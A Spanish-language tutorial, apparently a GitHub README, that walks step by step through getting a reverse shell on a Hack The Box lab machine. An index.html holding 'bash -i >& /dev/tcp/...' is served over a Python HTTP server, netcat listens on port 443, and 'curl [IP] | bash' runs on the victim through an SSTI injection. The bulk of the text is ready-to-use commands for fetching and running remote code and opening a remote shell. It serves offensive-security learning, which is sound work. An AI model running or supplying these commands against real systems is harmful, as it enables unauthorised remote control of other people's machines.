# Como establecer una reverse Shell con el comando Curl

En este artículo vamos a ver como establecer una `reverse shell` mediante una petición con `Curl`.

## ¿Qué es Curl?

Curl es una herramienta cuya finalidad es transferir datos a través de una URL. Es un comando disponible en la mayoría de los
sistemas basados en Unix. Es una abreviatura de `Client URL`. Los comandos de Curl están diseñados para funcionar como una forma
de verificar la conectividad a las URL y como una gran herramienta para transferir datos.

![Captura de pantalla 2022-07-21 225432](https://user-images.githubusercontent.com/103068924/180313605-edaba56e-d31d-4c74-bf50-4db5bfa3b27e.png)

* Información más detallada del funcionamiento de Curl --> <a href='https://www.hostinger.es/tutoriales/comando-curl' style="text-decoration:none">Link</a>

# Ejecución:

Para realizar esta operación lo primero que debemos comprobar es que podamos realizar la petición desde el equipo víctima y que este tenga Curl instalado.
Una vez tenemos esto solucionado vamos a ver el funcionamiento de manera básica.

Cuando realizamos una petición con Curl desde la máquina víctima:

   curl [Ip de Escucha]
   
   curl 10.10.14.25
   
Y nosotros nos ponemos en escucha desde nuestra terminal, utilizando un servicio HTTP montado con Python 3 por el puerto 80:

   sudo python3 -m http.server 80

El funcionamiento es el siguiente, cuando Curl envía una petición a nuestro equipo, estamos realizando una petición a `HTTP` tratando de conseguir
un `Index.html` (Para poder interpretar la página), aquí es donde viene la trampa.

Lo que nosotros vamos a hacer es crear nuestro propio archivo `index.html`, de forma que por dentro tenga los comandos para establecer una reverse shell con bash.
De esta manera, cuando hagamos la petición por Curl y le ordenemos ejecutarlo con bash se nos abrirá la reverse shell que hayamos establecido.

El archivo `index.html` debe guardarse en el mismo directorio desde donde utilicemos el servicio HTTP. 

# Ejemplo Práctico:

Vamos a necesitar tres terminales, una desde donde ejecutar la petición por Curl desde el equipo víctima, una segunda donde usaremos el servicio HTTP para 
compartir el archivo `index.html` y una tercera donde nos pondremos en escucha con `NetCat` (Aquí recibiremos la reverse shell).

Lo primero que vamos a hacer es preparar nuestro archivo `index.html`, creamos una carpeta llamada `shell` independiente para que nos sea más fácil:

    sudo mkdit shell
    
![Captura de pantalla -2022-07-21 23-14-02](https://user-images.githubusercontent.com/103068924/180318634-9039e512-5dab-4cf7-99fb-d69fe8dcbca0.png)
    
    cd shell
    
![Captura de pantalla -2022-07-21 23-15-05](https://user-images.githubusercontent.com/103068924/180318659-f19f4da8-ff95-44fb-b46a-8f63f949987a.png)

Ahora creamos y definimos nuestro archivo `index.html`:

   sudo nano index.html
   
![Captura de pantalla -2022-07-21 23-15-52](https://user-images.githubusercontent.com/103068924/180318692-e916b8a3-e127-4171-98ee-b01605450d1e.png)
   
Copiamos y pegamos el siguiente código:

```
#!/bin/bash

bash -i >& /dev/tcp/[Vuestra Ip]/[Puesto de escucha de NetCat] 0>&1

```

Debería de quedar algo así:

```
#!/bin/bash

bash -i >& /dev/tcp/10.10.14.25/443 0>&1
```

![Captura de pantalla -2022-07-21 23-16-43](https://user-images.githubusercontent.com/103068924/180318722-2a5ec9c3-9b86-48e4-bcdf-9f47bc9b7fb0.png)

Una vez copiado con vuestros datos, guardáis (Ctrl x O) y salís (Ctrl + X).

Bien, ya tenemos nuestra reverse shell en bash preparada y apuntado al puerto 443. Ahora, desde la misma terminal y permaneciendo en el directorio que contenga
el archivo que acabamos de crear, vamos a ejecutar el servicio HTTP con Python 3 para poder compartir el archivo `index.html`.

    sudo python3 -m http.server 80
    
![Captura de pantalla -2022-07-21 23-18-18](https://user-images.githubusercontent.com/103068924/180318750-583af3f0-3979-408a-8f19-24cbd4ac1e26.png)

![Captura de pantalla -2022-07-21 23-18-32](https://user-images.githubusercontent.com/103068924/180318759-76287747-7934-4bdd-b26b-fcd37566e552.png)
    
Abrimos nuestra segunda terminal y ponemos a `Netcat` en escucha por el puerto 443:

    sudo nc -lvnp 443
    
![Captura de pantalla -2022-07-21 23-18-57](https://user-images.githubusercontent.com/103068924/180318801-a0c03212-776c-406e-b262-ddfeb9f5937e.png)

![Captura de pantalla -2022-07-21 23-19-19](https://user-images.githubusercontent.com/103068924/180318810-361fce3a-2a9c-4a80-84e5-3a9761e055e5.png)
    
Ya tenemos nuestro puerto preparado para recibir la reversehe shell.
    
Finalmente, nos dirigimos a la terminal donde estemos en contacto con la víctima, es este ejemplo realizaré la petición usando BurpSuite ejecutando el comando
dentro de un SSTI. Pero básicamente, lo que debemos es realizar la siguiente petición desde el equipo víctima:

    curl 10.10.14.25 | bash
    
* `Curl` : Realizará la petición y copiará el archivo index.html desde nuestro servidor creado en Python 3.
* `bash` : Ordena la ejecución o interpretación del comando definido dentro del archivo, en nuestro caso, establecer una reverse shell por el puerto 443.

![Captura de pantalla 2022-07-21 231821](https://user-images.githubusercontent.com/103068924/180316903-81849cbf-96b0-4de3-a9f4-c7e0ab2e6610.png)

![Captura de pantalla 2022-07-21 231506](https://user-images.githubusercontent.com/103068924/180316657-1d03c885-ca4e-41b2-b55d-23f1a8e55b59.png)

Como podéis ver, el comando Curl está dentro de la inyección SSTI, de tal forma que ya solo quedaría enviar la petición. También podemos ver como en la terminal del servidor HTTP nos indica un `Get` con código de confirmación `200`.

![Captura de pantalla -2022-07-21 23-19-53](https://user-images.githubusercontent.com/103068924/180319019-ed62f921-811c-4b97-8b3d-2f9557c84a39.png)


Tras ejecutar este último comando se nos tendría que haber abierto una Shell en la terminal por la que estábamos en escucha con NetCat.

![Captura de pantalla -2022-07-21 23-20-30](https://user-images.githubusercontent.com/103068924/180319039-d19ac07c-d705-49d3-ba1f-237aa719bd23.png)

![Captura de pantalla -2022-07-21 23-20-07](https://user-images.githubusercontent.com/103068924/180319054-b99354ac-dc6f-4500-b035-6ce8b802428e.png)

Para este ejemplo hemos utilizado la máquina Nunchuchks de Hack the Box.


